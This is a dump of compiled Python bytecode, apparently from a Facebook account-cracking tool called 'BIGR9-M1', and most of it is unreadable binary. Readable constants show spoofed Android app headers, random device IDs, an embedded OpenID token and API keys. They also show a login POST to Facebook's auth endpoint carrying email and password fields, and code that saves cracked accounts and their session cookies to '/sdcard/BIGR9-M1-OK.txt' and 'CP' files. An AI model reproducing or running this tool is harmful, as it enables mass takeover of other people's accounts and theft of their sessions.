t\x19\x00\x00\x00\x00\x00\x00\x00\x00t-\x00\x00\x00\x00\x00\x00\x00\x00j.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00}!t\x19\x00\x00\x00\x00\x00\x00\x00\x00t-\x00\x00\x00\x00\x00\x00\x00\x00j.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00}"d\r}\x07t\x19\x00\x00\x00\x00\x00\x00\x00\x00d,j%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x1ej\'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t(\x00\x00\x00\x00\x00\x00\x00\x00j0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d/\xac.\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00}#d0|#\x9b\x00d1\x9d\x03}$g\x00d2\xa2\x01}%t\x15\x00\x00\x00\x00\x00\x00\x00\x00j\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|%\xab\x01\x00\x00\x00\x00\x00\x00}&d,j%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d3\x84\x00t3\x00\x00\x00\x00\x00\x00\x00\x00d4\xab\x01\x00\x00\x00\x00\x00\x00D\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00}\'|&|\'z\x00\x00\x00}(i\x00d5|\x1f\x93\x01d6d7\x93\x01d8t\x19\x00\x00\x00\x00\x00\x00\x00\x00t-\x00\x00\x00\x00\x00\x00\x00\x00j.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x93\x01d9t\x19\x00\x00\x00\x00\x00\x00\x00\x00t-\x00\x00\x00\x00\x00\x00\x00\x00j.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x93\x01d:t\x19\x00\x00\x00\x00\x00\x00\x00\x00t-\x00\x00\x00\x00\x00\x00\x00\x00j.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x93\x01d;d<\x93\x01d=d \x93\x01d>|\x00\x93\x01d?|\x06\x93\x01d@dA\x93\x01dBd \x93\x01dCd,\x93\x01d;d<\x93\x01d=d \x93\x01dDdE\x93\x01dFdG\x93\x01dHdI\x93\x01i\x00dJdK\x93\x01dLdM\x93\x01dNdO\x93\x01dPdQ\x93\x01dRdS\x93\x01dTd \x93\x01dUdV\x93\x01dWdX\x93\x01dYd \x93\x01dZd[\x93\x01d\\d]\x93\x01d^d,\x93\x01d_d!\x93\x01d`d$\x93\x01dadb\x93\x01dcdd\x93\x01dedf\x93\x01\xa5\x01dgdhdidj\x9c\x03\xa5\x01})i\x00dkdl\x93\x01dmdn\x93\x01dodp\x93\x01dqdr\x93\x01dsdt\x93\x01dkdl\x93\x01dudv\x93\x01dmdn\x93\x01dwdx\x93\x01dydx\x93\x01dzd{\x93\x01d|d!\x93\x01d}t5\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x93\x01dzd~\x93\x01d\x7fd\x80\x93\x01d\x81d\x82\x93\x01d\x83d\x84\x93\x01d\x85d\x86d\x87d\x88d\x89d\x8ad\x8ad\x8bd\x8c\x9c\x08\xa5\x01}*d\x8d}+d\x8e},t7\x00\x00\x00\x00\x00\x00\x00\x00j8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|+|)|*\xac\x8f\xab\x03\x00\x00\x00\x00\x00\x00j;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00}-d\x90|-v\x00r\x81t=\x00\x00\x00\x00\x00\x00\x00\x00d\x91|\x00z\x00\x00\x00d\x92z\x00\x00\x00|\x06z\x00\x00\x00d\x93z\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00d\x94j%\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x95\x84\x00|-d\x96\x19\x00\x00\x00D\x00\xab\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00}.t=\x00\x00\x00\x00\x00\x00\x00\x00d\x97|.z\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t?\x00\x00\x00\x00\x00\x00\x00\x00d\x98d\x99\xab\x02\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x9az\x00\x00\x00|\x06z\x00\x00\x00d\x9az\x00\x00\x00|.z\x00\x00\x00d\x9bz\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\n\x00\x00\x00\x00\x00\x00\x00\x00jA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00n\xb6|,t\x19\x00\x00\x00\x00\x00\x00\x00\x00|-\xab\x01\x00\x00\x00\x00\x00\x00v\x00r1d\x9ctB\x00\x00\x00\x00\x00\x00\x00\x00v\x00s\x02\x90\x04\x8c\xfbt=\x00\x00\x00\x00\x00\x00\x00\x00d\x9d|\x00z\x00\x00\x00d\x92z\x00\x00\x00|\x06z\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00|,jA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00nxd\x9e|-d\x9f\x19\x00\x00\x00d\xa0\x19\x00\x00\x00v\x00rkd\x9ctB\x00\x00\x00\x00\x00\x00\x00\x00v\x00r=t=\x00\x00\x00\x00\x00\x00\x00\x00d\xa1|\x00z\x00\x00\x00d\x92z\x00\x00\x00|\x06z\x00\x00\x00d\x93z\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t?\x00\x00\x00\x00\x00\x00\x00\x00d\xa2d\x99\xab\x02\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x9az\x00\x00\x00|\x06z\x00\x00\x00d\x9bz\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00n)t?\x00\x00\x00\x00\x00\x00\x00\x00d\xa2d\x99\xab\x02\x00\x00\x00\x00\x00\x00j\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x9az\x00\x00\x00|\x06z\x00\x00\x00d\x9bz\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x01\x00n\x03\x90\x05\x8c\x99\x04\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00d\x06z\r\x00\x00a\x03y\x00#\x00\x01\x00|\x03}\x04Y\x00\x90\x05\x8c\xadx\x03Y\x00w\x01#\x00t6\x00\x00\x00\x00\x00\x00\x00\x00jF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00jH\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r%\x01\x00tK\x00\x00\x00\x00\x00\x00\x00\x00jL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\xa3\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00tO\x00\x00\x00\x00\x00\x00\x00\x00|\x00|\x01|\x02\xab\x03\x00\x00\x00\x00\x00\x00\x01\x00Y\x00y\x00tP\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\n}/Y\x00d\x00}/~/y\x00d\x00}/~/w\x01w\x00x\x03Y\x00w\x01)\xa4N\xfa \r\r\x1b[1;32m [\x1b[1;32mBIGR9-M1\x1b[0m] \xfa\x0b|\x1b[1;32mOK|\xfa\x08 \x1b[1;32mr(\x00\x00\x00r\x02\x00\x00\x00rR\x00\x00\x00\xda\x05first\xda\x05First\xda\x04last\xda\x04Last\xda\x04Name\xda\x04name\xa9\x01\xfa2256002347743983%7C374e60f8b9bb6b8cbb30f78030438895\xe9o\x00\x00\x00rS\x00\x00\x00r\x18\x00\x00\x00r\x16\x00\x00\x00r,\x00\x00\x00rX\x00\x00\x00\xe9\xc7k\x9f\x06\xe9\xff\xc9\x9a;r~\x00\x00\x00r\x7f\x00\x00\x00r\x80\x00\x00\x00r\x81\x00\x00\x00r\x82\x00\x00\x00r\x83\x00\x00\x00r\x84\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r\x87\x00\x00\x00r{\x00\x00\x00rV\x00\x00\x00\xda\x04FB4Ar\x10\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xa9V\xda\x08X697X663\xda\x05X663B\xda\x06PR652B\xda\x04X267\xda\x05X5010\xda\x04X521\xda\x06X5514D\xda\x05X5515\xda\x06X5515F\xda\x04X559\xda\x05X559C\xda\x05X559F\xda\x04X571\xda\x04X572\xda\x04X573\xda\x05X573B\xda\x04X601\xda\x04X603\xda\x04X604\xda\x05X604B\xda\x04X605\xda\x04X606\xda\x05X606B\xda\x05X606C\xda\x05X606D\xda\x04X608\xda\x04X609\xda\x04X610\xda\x05X610B\xda\x04X612\xda\x05X612B\xda\x04X620\xda\x05X620B\xda\x04X622\xda\x04X623\xda\x05X623B\xda\x04X624\xda\x05X624B\xda\x04X625\xda\x05X625B\xda\x05X625D\xda\x04X626\xda\x05X626B\xda\x05X627V\xda\x04X650\xda\x05X650B\xda\x05X650C\xda\x05X650D\xda\x04X652\xda\x05X652A\xda\x05X652B\xda\x05X652C\xda\x04X653\xda\x05X653C\xda\x04X655\xda\x05X655C\xda\x05X655D\xda\x05X655F\xda\x04X656\xda\x04X657\xda\x05X657B\xda\x05X657C\xda\x05X659B\xda\x04X660\xda\x05X660B\xda\x05X660C\xda\x04X680\xda\x05X680B\xda\x05X680C\xda\x05X682B\xda\x05X682C\xda\x04X683\xda\x04X687\xda\x05X687B\xda\x05X688B\xda\x05X688CrG\x01\x00\x00\xda\x04X689\xda\x05X689B\xda\x05X689C\xda\x04X690\xda\x05X690B\xda\x04X692\xda\x04X693\xda\x04X695\xda\x05X695C\xe9+\x02\x00\x00r\x19\x00\x00\x00r\x1a\x00\x00\x00\xa9\x06\xda\x04Zongr\x13\x00\x00\x00\xda\nBanglalinkry\x00\x00\x00\xda\x0bMarshmallowz\rTelekom China\xe1\xb0\x04\x00\x00[FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;][FBAN/FB4A;FBAV/512.0.0.64.75;[FBAN/FB4A;FBAVFBBV/461420385;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]ru\x00\x00\x00\xe9\x10\x00\x00\x00\xa9\x01\xda\x01k\xe9\x14\x00\x00\x00\xfa\x02["\xfa\x02"]\xa9\x03\xda\x0228\xda\x0229\xda\x03210c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf3N\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]\x1d\x00\x00}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x04\x00\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x96\x01\x97\x01\x01\x00\x8c\x1f\x04\x00y\x00\xad\x03w\x01\xa9\x01N\xa9\x03r\x1d\x00\x00\x00r\x1e\x00\x00\x00\xda\x06digits\xa9\x02\xda\x02.0\xda\x01_s\x02\x00\x00\x00  r(\x00\x00\x00\xda\t<genexpr>z\x19newidx.<locals>.<genexpr>\x17\x01\x00\x00\xf3\x1a\x00\x00\x00\xe8\x00\xf8\x80\x00\xd0$M\xc1H\xb8q\xa4V\xa7]\xa1]\xb46\xd7%:\xc1H\xf9\xf3\x04\x00\x00\x00\x82#%\x01\xe9\x02\x00\x00\x00\xda\x04adid\xda\x06format\xda\x04json\xda\tdevice_id\xda\x10family_device_id\xda\x17secure_family_device_id\xda\x03cpl\xda\x04true\xda\x07try_num\xda\x05email\xda\x08password\xda\x06method\xfa\nauth.login\xda\x18generate_analytics_claim\xda\x0ccommunity_id\xda\x0bsim_serials\xfa\x18[\'80973453345210784798\']\xda\x0bopenid_flow\xda\randroid_login\xda\x0fopenid_provider\xda\x06google\xda\ropenid_emails\xfa\x0f[\'01710940017\']\xda\ropenid_tokens\xe1\xf6\x03\x00\x00[\'eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g\']\xda fb4a_shared_phone_cpl_experiment\xda&fb4a_shared_phone_nonce_cpl_at_risk_v3\xda\x1bfb4a_shared_phone_cpl_group\xda\x11enable_v3_at_risk\xda\x0eenroll_misauth\xda\x05false\xda\x18generate_session_cookies\xda\x11error_detail_type\xda\x14button_with_disabled\xda\x06source\xda\x10account_recovery\xda\x13generate_machine_id\xda\x07jazoest\xda\x042980\xda\x0fmeta_inf_fbmeta\xda\x0bV2_UNTAGGED\xda\x10encrypted_msisdn\xda\x1acurrently_logged_in_userid\xda\x06locale\xda\x13client_country_code\xda\x02US\xda\x18fb_api_req_friendly_name\xda\x0bautheticate\xda\x13fb_api_caller_class\xda\x0fFb4aAuthHandler\xda 882a8490361da98702bf97a021ddc14dr\xf6\x00\x00\x00\xda 4c854da0db9429f4913c2a1b221c1d30\xa9\x03\xda\x07api_key\xda\x0caccess_token\xda\x03sig\xda\x04Host\xfa\x14b-graph.facebook.com\xfa\x0cContent-Type\xfa!application/x-www-form-urlencoded\xfa\x0fAccept-Encoding\xfa\rgzip, deflate\xda\nConnection\xfa\nkeep-alive\xda\x04POST\xfa\x12/auth/login HTTP/2\xda\x08Priority\xfa\x06u=3, i\xfa\x0cX-Fb-Sim-Hni\xda\x0564301\xfa\x0cX-Fb-Net-Hni\xfa\x17X-Fb-Connection-Quality\xda\x04GOOD\xfa\nZero-Rated\xfa\nUser-Agent\xda\tEXCELLENT\xda\rAuthorization\xfa\nOAuth null\xfa\x19X-Fb-Connection-Bandwidth\xda\x0824807555\xfa\x14X-Fb-Connection-Type\xfa\nMOBILE.LTE\xda\x046060\xda\x05False\xda\x0cauthenticate\xda\x07unknown\xda\x05Liger\xda\x04True\xda\x042126\xa9\x08z\x11X-Fb-Device-Group\xfa\x10X-Tigon-Is-Retryz\x12X-Fb-Friendly-Namez\x1bX-Fb-Request-Analytics-Tagsz\x10X-Fb-Http-Enginez\x0eX-Fb-Client-Ipz\x13X-Fb-Server-Clusterz\x0eContent-Length\xfa\'https://b-graph.facebook.com/auth/login\xfaKLogin approvals are on. Expect an SMS shortly with a code to use for log in\xa9\x02\xda\x04data\xda\x07headers\xda\x0bsession_key\xfa\x15\r\r\x1b[1;32m [BIGR9-OK] \xfa\x03 | \xfa\x07\x1b[1;97mr-\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x003\x00\x00\x00\xf38\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]\x12\x00\x00}\x01|\x01d\x00\x19\x00\x00\x00d\x01z\x00\x00\x00|\x01d\x02\x19\x00\x00\x00z\x00\x00\x00\x96\x01\x97\x01\x01\x00\x8c\x14\x04\x00y\x03\xad\x03w\x01\xa9\x04r\xf4\x00\x00\x00\xda\x01=\xda\x05valueNr\x8e\x00\x00\x00\xa9\x02rf\x01\x00\x00r\xe3\x00\x00\x00s\x02\x00\x00\x00  r(\x00\x00\x00rh\x01\x00\x00z\x19newidx.<locals>.<genexpr>\\\x01\x00\x00\xf3%\x00\x00\x00\xe8\x00\xf8\x80\x00\xd07p\xd1Zo\xd0UV\xb8\x01\xb8&\xb9\t\xc0#\xb9\r\xc0a\xc8\x07\xc1j\xd58P\xd1Zo\xf9\xf3\x04\x00\x00\x00\x82\x18\x1a\x01\xda\x0fsession_cookies\xfa\x12\r\r\x1b[1;33m Cookie: \xfa\x17/sdcard/BIGR9-M1-OK.txt\xda\x01ar\xc2\x00\x00\x00rw\x00\x00\x00r\xbd\x00\x00\x00\xfa\x15\r\r\x1b[1;34m [BIGR9-2F] \xfa\x10www.facebook.com\xda\x05error\xda\x07message\xfa\x15\r\r\x1b[1;31m [BIGR9-CP] \xfa\x17/sdcard/BIGR9-M1-CP.txtr\x05\x00\x00\x00\xa9)\xda\x03sys\xda\x06stdout\xda\x05write\xda\x04loopr\xb6\x00\x00\x00r\xd6\x00\x00\x00\xda\x05flushr\xd2\x00\x00\x00\xda\x07replace\xda\x05lowerr\x1d\x00\x00\x00r \x00\x00\x00r\x1f\x00\x00\x00\xda\x06device\xda\x06sim_idr\x1e\x00\x00\x00r!\x00\x00\x00\xda\x06Random\xda\x04join\xda\x07choices\xda\x06string\xda\thexdigits\xda\x04uuid\xda\x05uuid4rd\x01\x00\x00r\xce\x00\x00\x00r0\x00\x00\x00r\xd8\x00\x00\x00\xda\x04postrn\x01\x00\x00r\x8c\x00\x00\x00r\xc6\x00\x00\x00r\xcf\x00\x00\x00r\xd0\x00\x00\x00r\xd7\x00\x00\x00r\xd9\x00\x00\x00r\xda\x00\x00\x00r\xca\x00\x00\x00r\xcb\x00\x00\x00\xda\x04api3\xda\tException\xa90r\xe8\x00\x00\x00r\xe9\x00\x00\x00r\xea\x00\x00\x00\xda\x02fn\xda\x02ln\xda\x02pw\xda\x03pas\xda\x0baccessToken\xda\x04fbav\xda\x04fbbvr~\x00\x00\x00r\x7f\x00\x00\x00r\x80\x00\x00\x00r\x81\x00\x00\x00r$\x00\x00\x00r\x82\x00\x00\x00r\x83\x00\x00\x00r\x84\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r\x87\x00\x00\x00\xda\x04fbfw\xda\x04fbrv\xda\x04fban\xda\x04fbpnr"\x00\x00\x00\xda\x06inform\xda\x03ams\xda\x07networkr\'\x00\x00\x00\xda\x0brandom_seedrl\x01\x00\x00ro\x01\x00\x00\xda\x06secure\xda\x06familyr\xdd\x00\x00\x00r{\x01\x00\x00\xda\x02li\xda\x03li2\xda\x02j1r\x91\x01\x00\x00r\xca\x01\x00\x00r\xcb\x01\x00\x00\xda\x03url\xda\x03twf\xda\x02po\xda\x04cokir&\x00\x00\x00s0\x00\x00\x00                                                r(\x00\x00\x00r\xd5\x00\x00\x00r\xd5\x00\x00\x00\xeb\x00\x00\x00\xf3\r\x08\x00\x00\x80\x00\xf0\x02K\x02\t\x15\xe4\x10\x13\x97\n\x91\n\xd7\x10 \xd2\x10 \xd6mq\xd4ru\xd4vy\xd5rz\xd0!{\xd4\x10|\xf4\x00\x00~\x01A\x02\xf7\x00\x00~\x01H\x02\xf1\x00\x00~\x01H\x02\xf7\x00\x00~\x01N\x02\xf1\x00\x00~\x01N\x02\xf4\x00\x00~\x01P\x02\xd8\x15\x1a\x97[\x91[\xa0\x13\xd3\x15%\xa0a\xd1\x15(\x90\x02\xf0\x02\x03\x11 \xd8\x1d"\x9f[\x99[\xa8\x13\xd3\x1d-\xa8a\xd1\x1d0\x98\x02\xf4\x06\x00\x1b#\x90B\xd8\x1e \x9fj\x99j\xa8\x17\xb0\x12\xb7\x18\xb1\x18\xb3\x1a\xd3\x1e<\xd7\x1eD\xd1\x1eD\xc0W\xc8R\xd3\x1eP\xd7\x1eX\xd1\x1eX\xd0Y_\xd0`b\xd7`h\xd1`h\xd3`j\xd3\x1ek\xd7\x1es\xd1\x1es\xd0tz\xd0{}\xd3\x1e~\xf7\x00\x00\x1fG\x02\xf1\x00\x00\x1fG\x02\xf0\x00\x00H\x02N\x02\xf0\x00\x00O\x02T\x02\xf3\x00\x00\x1fU\x02\xf7\x00\x00\x1f]\x02\xf1\x00\x00\x1f]\x02\xf0\x00\x00^\x02d\x02\xf0\x00\x00e\x02j\x02\xf7\x00\x00e\x02p\x02\xf1\x00\x00e\x02p\x02\xf3\x00\x00e\x02r\x02\xf3\x00\x00\x1fs\x02\x98\x03\xd8&[\x98\x0b\xdc"(\xa7.\xa1.\xb0\x13\xb0S\xd3"9\xd0!:\xb8%\xc4\x06\xc7\x0e\xc1\x0e\xc8r\xd0RT\xd3@U\xd0?V\xd0VW\xd4X^\xd7Xf\xd1Xf\xd0gj\xd0kn\xd3Xo\xd0Wp\xd0\x1fq\x98\x04\xdc\x1f"\xa46\xa7>\xa1>\xb0)\xb8I\xd3#F\xd3\x1fG\x98\x04\xdc*0\xd01B\xd1*C\x98\x0f\xdc &\xa0w\xa1\x0f\x98\x05\xdc &\xa0w\xa1\x0f\x98\x05\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xdc\x1f%\xa0f\x99~\x98\x04\xd8\x1f"\x98\x04\xd8\x1f"\x98\x04\xd8\x1f%\x98\x04\xd8\x1f4\x98\x04\xdc\x1d#\x9f]\x99]\xa8G\xb0G\xd0+<\xd3\x1d=\x98\x02\xdc!\'\xa7\x1d\xa1\x1d\xf2\x00\x000F\x0b\xf3\x00\x00"G\x0b\x98\x06\xdc\x1e!\xa4&\xa7.\xa1.\xb0\x13\xb0S\xd3"9\xd3\x1e:\xb87\xd1\x1eB\xc43\xc4v\xd7GW\xd1GW\xd0XY\xd0Z\\\xd3G]\xd3C^\xd1\x1e^\xd4_b\xd4ci\xd7cq\xd1cq\xd0ru\xd0vy\xd3cz\xd3_{\xd1\x1e{\x98\x03\xdc"(\xa7-\xa1-\xd20s\xd3"t\x98\x07\xf0\x02\x00\x1f]\x13\x98\x02\xdc&,\xa7m\xa1m\xa3o\x98\x0b\xdc\x1f"\xa02\xa77\xa17\xa8;\xd7+>\xd1+>\xbcv\xd7?O\xd1?O\xd0SU\xd0+>\xd3+V\xd3#W\xd3\x1fX\x98\x04\xdc$\'\xac\x04\xaf\n\xa9\n\xab\x0c\xd3$5\x98\t\xdc!$\xa4T\xa7Z\xa1Z\xa3\\\xd3!2\x98\x06\xdc!$\xa4T\xa7Z\xa1Z\xa3\\\xd3!2\x98\x06\xd8&[\x98\x0b\xdc\x1c\x1f\xa0\x02\xa7\x07\xa1\x07\xa8\x0b\xd7(;\xd1(;\xbcF\xbfM\xb9M\xc8R\xd0(;\xd3(P\xd3 Q\xd3\x1cR\x98\x02\xd8(*\xa82\xa8$\xa8b\xa0k\x98\x0b\xda\x1d.\x98\x02\xdc\x1e$\x9fm\x99m\xa8B\xd3\x1e/\x98\x03\xd8\x1d\x1f\x9fW\x99W\xd1$M\xc4E\xc8!\xc4H\xd3$M\xd3\x1dM\x98\x02\xd8"%\xa0b\xa1&\x98\x07\xf0\x02$ *\xa0\x06\xa8\x04\xf0\x00$ *\xd8\x00\x08\x88&\xf0\x03$ *\xe0\x00\x0b\x8cS\x94\x14\x97\x1a\x91\x1a\x93\x1c\xd3\r\x1e\xf0\x05$ *\xf0\x06\x00\x01\x13\x94C\x9c\x04\x9f\n\x99\n\x9b\x0c\xd3\x14%\xf0\x07$ *\xf0\x08\x00\x01\x1a\x9c3\x9ct\x9fz\x99z\x9b|\xd3\x1b,\xf0\t$ *\xf0\n\x00\x01\x06\x80v\xf0\x0b$ *\xf0\x0c\x00\x01\n\x883\xf0\r$ *\xf0\x0e\x00\x01\x08\x88\x13\xf0\x0f$ *\xf0\x10\x00\x01\x0b\x88C\xf0\x11$ *\xf0\x12\x00\x01\t\x88,\xf0\x13$ *\xf0\x14\x00\x01\x1b\x983\xf0\x15$ *\xf0\x16\x00\x01\x0f\x88r\xf0\x17$ *\xf0\x18\x00\x01\x06\x80f\xf0\x19$ *\xf0\x1a\x00\x01\n\x88#\xf0\x1b$ *\xf0\x1c\x00\x01\x0e\xd0\x0f)\xf0\x1d$ *\xf0\x1e\x00\x01\x0e\x88\x7f\xf0\x1f$ *\xf0 \x00\x01\x12\x908\xf1!$ *\xf0"\x00\x01\x10\xd0\x11"\xf0#$ *\xf0$\x00\x01\x10\xf0\x00\x00\x12J\x10\xf0%$ *\xf0&\x00\x01#\xd0#K\xf0\'$ *\xf0(\x00\x01\x1e\xd0\x1e1\xf0)$ *\xf0*\x00\x01\x11\x90\x17\xf0+$ *\xf0,\x00\x01\x1b\x983\xf0-$ *\xf0.\x00\x01\x14\xd0\x14*\xf0/$ *\xf00\x00\x01\t\xd0\t\x1b\xf01$ *\xf02\x00\x01\x16\x90c\xf03$ *\xf04\x00\x01\n\x88&\xf05$ *\xf06\x00\x01\x12\x90-\xf07$ *\xf08\x00\x01\x13\x902\xf09$ *\xf0:\x00\x01\x1d\x98S\xf0;$ *\xf0<\x00\x01\t\x88\'\xf0=$ *\xf0>\x00\x01\x16\x90t\xf0?$ *\xf0@\x01\x00\x01\x1b\x98=\xf0A\x01$ *\xf0B\x01\x00\x01\x16\xd0\x16\'\xf1C\x01$ *\xf0D\x01\x00\x0b-\xd8\x0fC\xd8\x06(\xf2I\x01$ 